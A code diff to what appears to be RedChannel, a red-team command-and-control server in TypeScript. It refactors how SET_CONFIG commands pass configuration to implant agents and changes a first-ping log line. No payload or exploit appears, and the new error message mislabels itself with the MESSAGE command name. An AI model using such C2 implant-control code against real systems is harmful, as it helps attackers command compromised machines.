@@ -231,7 +231,7 @@ export default class RedChannel {
         this.sendCommandKeyx();
     }
 
-    sendAgentCommand(agentId: string, agentCommand: implant.AgentCommand, parameters?: string) {
+    sendAgentCommand(agentId: string, agentCommand: implant.AgentCommand, parameters?: string, implantConfig?: Partial<c2.ImplantModuleConfig>) {
         switch (agentCommand) {
             case implant.AgentCommand.SYSINFO:
                 this.sendCommandSysinfo(agentId);
@@ -253,15 +253,8 @@ export default class RedChannel {
                 this.sendCommandShutdown(agentId);
                 break;
             case implant.AgentCommand.SET_CONFIG:
-                {
-                    let config: Partial<c2.ImplantModuleConfig>;
-                    try {
-                        config = JSON.parse(parameters || "{}") as c2.ImplantModuleConfig;
-                    } catch (e) {
-                        throw new Error(`${implant.AgentCommand[implant.AgentCommand.SET_CONFIG]}: invalid json config object (see implant in redchannel.conf)`);
-                    }
-                    this.sendCommandSetConfig(agentId, config);
-                }
+                if (!implantConfig) throw new Error(`${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: invalid config`);
+                this.sendCommandSetConfig(agentId, implantConfig);
                 break;
             case implant.AgentCommand.MESSAGE:
                 if (!parameters?.length) throw new Error(`${implant.AgentCommand[implant.AgentCommand.MESSAGE]}: invalid message`);
@@ -614,7 +607,7 @@ export default class RedChannel {
         const agentId = segments.agentId;
         if (!this.agents.has(agentId)) {
             this.initAgent(agentId, channel, req.connection.remoteAddress);
-            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${channel}`);
+            this.log.warn(`first ping from agent ${agentId}, src: ${req.connection.remoteAddress}, channel: ${c2.AgentChannel[channel]}`);
             const answers = this.processAgentFirstPing(agentId, hostname);
             if (answers) res.answer = res.answer.concat(answers);
             return res.end();
